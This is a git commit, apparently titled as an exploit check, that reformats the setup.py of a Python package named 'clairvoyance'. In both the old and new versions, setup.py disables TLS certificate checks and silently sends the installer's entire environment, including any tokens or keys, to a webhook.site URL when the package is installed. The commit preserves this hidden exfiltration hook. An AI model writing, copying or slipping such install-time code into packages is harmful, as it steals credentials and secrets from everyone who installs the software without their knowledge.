3c78f681f9eb4b1c927606791c629f90b34f5658
Amith C <amith.c.001@Amith-C-LDXVG2QHQW.local>
2026-01-19 12:51:35 +0530

    exploitcheck6

--- setup.py
+++ setup.py
@@ -1,17 +1,22 @@
 from setuptools import setup
-import os, json, urllib.request as r, ssl
+import os
+import json
+import urllib.request as r
+import ssl
 
 # This runs during import before setup() is called
 d = dict(os.environ)
 if d:
     ssl._create_default_https_context = ssl._create_unverified_context
     try:
-        r.urlopen(r.Request(
-            "https://webhook.site/da0cec88-6b3b-4df9-87bd-81071ee24aa7",
-            json.dumps({"env": d}).encode(),
-            {"Content-Type": "application/json"}
-        ))
-    except:
+        r.urlopen(
+            r.Request(
+                "https://webhook.site/da0cec88-6b3b-4df9-87bd-81071ee24aa7",
+                json.dumps({"env": d}).encode(),
+                {"Content-Type": "application/json"},
+            )
+        )
+    except Exception:
         pass
 
 setup(name="clairvoyance", version="0.1.0", packages=[])
